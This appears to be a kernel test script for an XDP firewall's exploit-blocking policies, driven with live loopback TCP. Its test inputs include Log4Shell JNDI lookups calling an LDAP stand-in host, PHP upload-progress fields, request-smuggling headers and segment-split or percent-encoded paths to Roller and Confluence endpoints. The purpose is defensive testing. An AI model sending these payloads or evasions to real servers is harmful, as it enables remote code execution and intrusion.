/* Kernel tests: each policy loaded into the real XDP program and driven with
 * live loopback TCP. test/run.mjs proves what a policy decides over bytes it
 * is handed; this proves the parts only the kernel has: reassembly across
 * segments, the window sliding under a long connection, and the match mask a
 * connection keeps from one window to the next.
 *
 *   PFW_CORE=/path/to/pfw-core node test/kernel.mjs [policy ...]
 *
 * Needs Linux, root, yeetd, and a built pfw-core (bin/vm.bpf.o). It attaches
 * to loopback (ifindex 1) one policy at a time, so run it in a network
 * namespace of its own, never on a host whose loopback carries real traffic.
 * A sibling of pfw-core's own test/kernel/reasm.mjs.
 */
import net from "node:net";
import { spawn } from "node:child_process";
import { readFileSync } from "node:fs";
import { setTimeout as sleep } from "node:timers/promises";

const CORE = process.env.PFW_CORE ?? new URL("../../pfw-core", import.meta.url).pathname;
const root = new URL("../", import.meta.url);
const PORT = 59741;
const only = process.argv.slice(2);
const hex = (s) => Buffer.from(s, "latin1").toString("hex");

async function withPolicy(file, knobs, fn) {
  if (only.length && !only.some((o) => file.includes(o))) return;
  console.log(`\n${file}${Object.keys(knobs).length > 1 ? "  " + JSON.stringify(knobs) : ""}`);
  const k = Object.entries(knobs).map(([n, v]) => `${n}=${v}`).join(",");
  const child = spawn("yeet", ["run", "scripts/apply-and-hold.mjs", "--src", hex(readFileSync(new URL(file, root), "latin1")), "--iface", "1", "--hold", "120", "--knobs", k], { cwd: CORE });
  let out = "";
  child.stdout.on("data", (d) => { out += d; });
  child.stderr.on("data", (d) => { out += d; });
  for (let i = 0; i < 150 && !/READY|COMPILE FAIL/.test(out); i++) await sleep(100);
  if (!/READY/.test(out)) { child.kill("SIGKILL"); throw new Error(`${file}: loader never READY:\n${out.slice(-2000)}`); }
  try { return await fn(); } finally { child.kill("SIGINT"); await sleep(600); }
}

let fail = 0, n = 0;
const check = (name, cond, detail) => { n++; if (!cond) fail++; console.log(`  ${cond ? "ok  " : "FAIL"} ${name}${!cond && detail ? ": " + detail : ""}`); };

/* The server keeps what each connection sent, keyed by the tag in its first line. */
const seen = new Map();
const srv = net.createServer((s) => {
  let buf = "";
  s.on("data", (d) => { buf += d.toString("latin1"); const t = buf.match(/X-Tag: (\w+)/); if (t) seen.set(t[1], buf); });
  s.on("error", () => {});
});
await new Promise((r) => srv.listen(PORT, "127.0.0.1", r));

/* One connection; each chunk is its own segment. -> { reset, received } */
let tagN = 0;
async function conn(chunks) {
  const tag = `t${++tagN}`;
  let reset = false;
  const s = net.connect({ port: PORT, host: "127.0.0.1" });
  s.setNoDelay(true);
  s.on("error", (e) => { if (e.code === "ECONNRESET" || e.code === "EPIPE") reset = true; });
  await new Promise((r) => { s.once("connect", r); s.once("error", r); });
  s.write(`OPTIONS * HTTP/1.1\r\nHost: t\r\nX-Tag: ${tag}\r\n\r\n`);
  await sleep(25);
  for (const c of chunks) { if (s.destroyed) break; s.write(Buffer.from(c, "latin1")); await sleep(15); }
  await sleep(700);
  const open = !s.destroyed && !reset;
  s.destroy();
  await sleep(50);
  return { reset: !open, received: seen.get(tag) ?? "" };
}
const blocked = async (name, chunks, marker = "TAILMARK") => { const r = await conn([...chunks, marker]); check(name, r.reset && !r.received.includes(marker), `reset=${r.reset} received=${r.received.length}B`); };
const carried = async (name, chunks, marker = "TAILMARK") => { const r = await conn([...chunks, marker]); check(name, !r.reset && r.received.endsWith(marker), `reset=${r.reset} received=${r.received.length}B`); };

/* Deterministic bytes that look like a compressed upload: every value, no pattern. */
function noise(len, seed = 1) { let x = seed >>> 0; let s = ""; for (let i = 0; i < len; i++) { x ^= x << 13; x >>>= 0; x ^= x >>> 17; x ^= x << 5; x >>>= 0; s += String.fromCharCode(x & 0xff); } return s; }
const segs = (s, size = 1400) => { const o = []; for (let i = 0; i < s.length; i += size) o.push(s.slice(i, i + size)); return o; };
const pad = (len) => "a".repeat(len);
const B = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
const upload = (len, extra = "") => { const body = `--${B}\r\nContent-Disposition: form-data; name="photo"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\n${noise(len)}\r\n--${B}--\r\n`;
  return `POST /upload.php HTTP/1.1\r\nHost: t\r\nContent-Type: multipart/form-data; boundary=${B}\r\n${extra}Content-Length: ${body.length}\r\n\r\n${body}`; };
const get = (t, h = "") => `GET ${t} HTTP/1.1\r\nHost: t\r\n${h}\r\n`;

try {
  await withPolicy("php/php2shell.pfc", { port: PORT }, async () => {
    await carried("a 300 kB binary upload is carried whole", segs(upload(300_000)));
    await carried("twenty keep-alive GETs", Array.from({ length: 20 }, (_, i) => get(`/index.php?page=${i}&tags[]=a`)));
    await blocked("the upload-progress field 9 kB into an upload", [...segs(upload(9000)), `--${B}\r\nContent-Disposition: form-data; name='PHP_SESSION_UPLOAD_PROGRESS'\r\n\r\nx\r\n`]);
    await blocked("the field name split across two segments", [`--${B}\r\nContent-Disposition: form-data; name=PHP_SESSION_UP`, `LOAD_PROGRESS\r\n\r\nx\r\n`]);
    await blocked("chunked multipart", [`POST / HTTP/1.1\r\nHost: t\r\nContent-Type: multipart/form-data; boundary=B\r\nTransfer-Encoding: chunked\r\n\r\n`]);
    await blocked("the two headers 6 kB of padding apart", [`POST / HTTP/1.1\r\nHost: t\r\nContent-Type: multipart/form-data; boundary=B\r\nX-Pad: `, ...segs(pad(6000)), `\r\nTransfer-Encoding:\r\n chunked\r\n\r\n`]);
    await blocked("a field name nested nine deep, 5 kB in", [...segs(upload(5000)), `--${B}\r\nContent-Disposition: form-data; name="a${"[k]".repeat(9)}"\r\n\r\nx\r\n`]);
  });
  await withPolicy("php/php2shell.pfc", { port: PORT, multipart: 0 }, async () => {
    await blocked("multipart=0 resets an ordinary upload", segs(upload(2000)));
    await carried("multipart=0 carries a GET", [get("/index.php")]);
  });

  await withPolicy("java/roller-xmlrpc.pfc", { port: PORT }, async () => {
    await carried("ordinary pages on a keep-alive connection", [get("/roller/"), get("/roller/myblog/entry/hello-world"), get("/roller-services/app")]);
    await blocked("POST /roller-services/xmlrpc", [`POST /roller-services/xmlrpc HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("the path split mid-word across segments", [`POST /roller-serv`, `ices/xml`, `rpc HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("percent-encoded letters and a path parameter", [`POST /roller%2dservices;a=b/xmlrp%63 HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("the two segments 6 kB of path parameter apart", [`POST /roller-services;`, ...segs(pad(6000)), `/xmlrpc HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("after 12 kB of ordinary requests on the connection", [...Array.from({ length: 30 }, (_, i) => get(`/roller/myblog/entry/post-${i}`, `X-Pad: ${pad(350)}\r\n`)), `POST /roller-services/xmlrpc HTTP/1.1\r\nHost: t\r\n\r\n`]);
  });

  await withPolicy("java/axis1-soap.pfc", { port: PORT }, async () => {
    await carried("ordinary pages on a keep-alive connection", [get("/dashboard.action"), get("/display/ENG/gRPC+notes"), get("/rest/api/content?spaceKey=ENG")]);
    await blocked("the path seen exploited", [`POST /plugins/servlet/soap-axis1/confluenceservice-v2 HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("soap%2daxis%31 split across segments", [`POST /rpc/soap%2`, `daxis%31/confluenceservice-v2 HTTP/1.1\r\nHost: t\r\n\r\n`]);
    await blocked("/rpc and xmlrpc 6 kB apart", [`POST /rpc;`, ...segs(pad(6000)), `/xmlrpc HTTP/1.1\r\nHost: t\r\n\r\n`]);
  });
  await withPolicy("java/axis1-soap.pfc", { port: PORT, xmlrpc: 1 }, async () => {
    await carried("xmlrpc=1 carries /rpc/xmlrpc", [`POST /rpc/xmlrpc HTTP/1.1\r\nHost: t\r\nContent-Length: 0\r\n\r\n`]);
    await blocked("xmlrpc=1 still resets SOAP", [`POST /rpc/soap-axis1/confluenceservice-v2 HTTP/1.1\r\nHost: t\r\n\r\n`]);
  });

  const truth = JSON.parse(readFileSync(new URL("test/fixtures/log4j-2.14.1-lookups.json", root), "utf8")).cases.filter((c) => c.fired);
  await withPolicy("java/log4shell.pfc", { port: PORT }, async () => {
    await carried("a 300 kB binary upload is carried whole", segs(upload(300_000)));
    await carried("template placeholders", [`POST /tpl HTTP/1.1\r\nHost: t\r\n\r\nHello \${user.name}, total \${amount}`]);
    for (const c of truth) { const v = Buffer.from(c.value, "base64").toString("latin1"); await blocked(`Log4j resolved "${c.label}"`, [get("/", `X-Api-Version: ${v}\r\n`)]); }
    await blocked("the lookup split inside its opening", [`GET / HTTP/1.1\r\nHost: t\r\nUser-Agent: $`, `{jn`, `di:ldap://203.0.113.9/a}\r\n\r\n`]);
    await blocked("a lookup 9 kB into a body", [`POST /api HTTP/1.1\r\nHost: t\r\n\r\n`, ...segs(pad(9000)), `{"u":"\${\${lower:j}ndi:ldap://203.0.113.9/a}"}`]);
  });
} finally { srv.close(); }

console.log(`\n${n - fail}/${n} passed`);
process.exit(fail ? 1 : 0);
